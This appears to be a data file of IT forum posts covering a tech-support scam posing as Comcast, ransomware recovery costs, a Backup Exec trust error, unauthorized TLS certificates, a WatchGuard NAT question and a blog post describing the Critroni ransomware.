297431,iTech247 -  anyone heard of them?,"EDIT: A google search for ""comcast support"" returns the 800 number for iTech247, who will tell you that they are Comcast and will procede to talk you out of $200 and then spend a few hours ""fixing"" your computer. It does appear that they do actually do some good, but overall they do very little. They might steal your info they might not, but in any event this is something to be aware of. I have passed the information onto Comcast who are investigating this.Warm your end users/customers of this!!EDIT 2: Comcast has apparently fixed this. They no longer show up in the search results. I am actually quite impressed by how fast they reacted to my report.---------------------------------- So my dad was having some issues with his email and he called Comcast about it, they quickly worked out that there were some issues with the PC itself so they referred him to some company named iTech247. So then this iTech247 promptly took $200 from him, remoted into his machine and ran SuperAntiSpyware and proceded to tell him about how spyware specifically breaks microsoft products (some such garbage), they also went on to tell him that Avast was not a good business product and was not adequately protecting him but not to worry the money he spent also includes the Microsoft Security Essentials... The end result is they spent about an hour or so on his computer apparently fixing it finishing it all off by removing Avast! and installed MS Security essentials. I have not gotten onto the machine yet to see if they actually have done what they said they did and to make sure the machine is not further compromised by these idiots.",0

2143735,New Trend: More Public Scrutiny of Ransomware Attacks and Recovery Plans?,"Hi all,Interested to see if others are noticing a difference in public reactions to ransomware attacks...Ever since the attack on Atlanta (where recovery costs have mushroomed from $2.6 million to $9.5 million), it seems like there's been more public scrutiny on recovery plans. Specifically: how much money compromised orgs are spending to recover/improvewhat improvement efforts actually consist ofWhereas orgs have typically been very vague about these things, I'm now seeing cases where detailed costs / itemized recovery budgets are being published in the press, opening them up to greater scrutiny: Ex: http://www.dailyadvance.com/News/2018/06/22/Fending-off-future-cyberattacks-to-cost-102K.htmlIt seems like these are primarily limited to attacks on local governments and school districts for now, which makes sense. After all, this is tax payer money you're talking about. But I wonder if it may become a wider trend now that mainstream awareness of these attacks is rising and the public, stockholders, etc. are getting more fed up and interested in what orgs are actually doing to make sure they don't get hit again. What do you think? Have you been noticing this, too? Has your org been talking about this or have you experienced it firsthand?Do you think more public scrutiny of recovery costs and IT security investment is a good thing? A bad thing?",5

I was able to install BE15 on Win2012 server(1 Physical Server)with Tape, and remote agent install to the Fileserver (Win2012 Physical Server) do a backup test bare metal restore before building out third server.All seemed well, I finally finished the conversion to 2012 and push installed the Agent to the AD/DC DNS DHCP 2012 Server and can't get trust established, these are 3 Identical Physical Servers, (Fileserver has more disk space only) I tried uninstalling and re-installing the Agent same problem Can't establish trust FailCode E0000383. I'm pretty sure I did everything the same as the Fileserver that gave no issues. I really don't like messing around install/uninstall trouble shoot on my Primary AD DC, I am using the Domain Admin account same as I used on the Fileserver so the Credentials it keeps complaining about are working with the FS..Should I find something better? my Experience with BExec is if you get it setup it will work, but when you have issues it can be rough, and by now there may be something else that's better I looked at VEEAM just a little but they seem to be more geared to virtual, I know about their free backup for Physical Machines but I was thinking I need something more developed for my environment, 200 users at a hospital facility. I'm just blown away that it looked like BE was going to work so well and when it got to the more complicated config on the other server it started giving issues, I also wanted to use the server that BE15 is installed on as the Backup DC as it would only be doing backups at night when all office users are gone but now I'm even worried about doing that after this fail.. I don't know maybe it's something simple, maybe it's me but.... Any advice would be greatly appreciated. Thanks in advance.",0

858011,Google discovers unauthorized certificates in TLS that affect all OSes,"Google has discovered unauthorized digital certificates on a number of different domains that indicate ""misused credentials ... [that can] impersonate other unnamed sites."" What's more: All operating systems and browsers are at risk to the errors in the Transport Layer Security (TLS) system. According to Ars Technica, Adam Langley, a security engineer at Google, discovered the unauthorized certificates, which have been traced back to ""Egypt-based MCS Holdings, an intermediate certificate authority that operates under the China Internet Network Information Center (CNNIC)."" This signals a policy breach of the rules set forth by certificate authority and browser makers. Following his discovery, Langley notified the CNNIC and ""blocked the MCS Holdings certificate in Chrome with a CRLSet push."" ﻿Langley further writes in his own blog that ""Chrome on Windows, OS X, and Linux, ChromeOS, and Firefox 33 ... have rejected these certificates because of public-key pinning."" The oversight, according to Langley, came about when the CNNIC contracted MC Holdings to issue certificates ""for domains that they had [already] registered."" MC Holdings, however, installed the private key ""in a man-in-the-middle proxy."" In response to what has been one of many faults discovered in TLS, Ars Technica issues a strong critique of the system as a whole: Defenders of the current system for acquiring and revoking TLS certificates have recently chafed in response to statements from this author that it's hopelessly broken. Besides remembering that almost all of these critics have a strong financial interest in the way the system works now, consider this: after more than a decade of breaches, the system can be and occasionally still is crippled by a single point of failure that requires patches from multiple software providers. In Monday's post, Langley held outcertificate transparency as one potential antidote. Other possible remedies include a more streamlined form of certificate pinning and several proposals similarly aimed at mending the most serious holes.﻿While Chrome has revoked the certificates, Mozilla has said that they ""will [have a permanent fix] in the upcoming Firefox version 37."" ",0

425282,To NAT or not to NAT...that is the question,We have a WatchGuard XTM 505 running version 11.8 and a Cisco Linksys E4200 that provides wireless for people in the office. I have a manager who bought an iPad mini so he can connect to Evernote and stay better organized. The WatchGuard is blocking the connection to Evernote. I set a static IP address on the iPad for him in the wireless range then added that IP address to the WatchGuard unrestricted users list and it's still blocking the connection (it continues to grab the policy of the restricted users bypassing the unrestricted policy). I contacted WatchGuard and they ran a test then said I needed to either add the IP address of the wireless router to the unrestricted users list (which would give everyone with a wireless connection unrestricted access - i.e. not going to happen) or turn off NAT on the wireless router. I started reading about NAT and am not sure that's a great idea.So I have two questions:1.) What would happen if I turned off NAT on the wireless router?2.) Is there a better/more secure way for me to add this user's device to the unrestricted user list or otherwise unblock Evernote for him? I know there are other people in the company would love to use Evernote but I've never used the program and don't know its capabilities.

547356,Critroni – Newest Addition to Encrypting Ransomware,"Blog by Tyler Moffitt, Webroot Threat ResearcherIn my last blog post about a week ago, I talked about how Cryptolocker and the like are not dead and we will continue to see more of them in action. It’s a successful “business model” and I don’t see it going away anytime soon. Not even a few days after my post a new encrypting ransomware emerged. This one even targets Russians!Presenting CritroniThis newest edition of encrypting ransomware uses the same tactics of contemporary variants including: paying through anonymous tor, using Bitcoin as the currency, changing the background, dropping instructions in common directories on how to pay the scam. Some upgrades that are new to the encrypting ransomware scene are logging the entire directory list of files that were encrypted and then storing them in your documents folder for your convenience come decryption time (how nice of them).The ransom amount scales with how many files are encrypted. My specific encryption only wanted “.2 Bitcoin (about 24USD)” Please note that the exchange rate displayed by the malware is extremely wrong and .2 Bitcoin is about $120.This specific variant we analyzed does not delete the VSS (Volume Shadow Service) and you can get all your files back by using programs like Shadow Explorer. I expect that once this malware goes into widespread distribution for the US and UK that “issues” like this will get fixed and the price will rise to around .5 BTC (around $300) on average. Webroot will catch this specific variant in real time before any encryption takes place and we’re always on the look out for more, but just in case of new zero day variants remember that with encrypting ransomware the best protection is going to be a good backup solution. This can be either through the cloud or offline but keeping it up to date is key so as not to lose productivity. Webroot has backup features built into our product that allow you to have directories constantly synced to the cloud. If you were to get infected by a zero day variant of encrypting ransomware you can just restore your files back as we save a snapshot history for each of your files up to ten previous copies.﻿",0
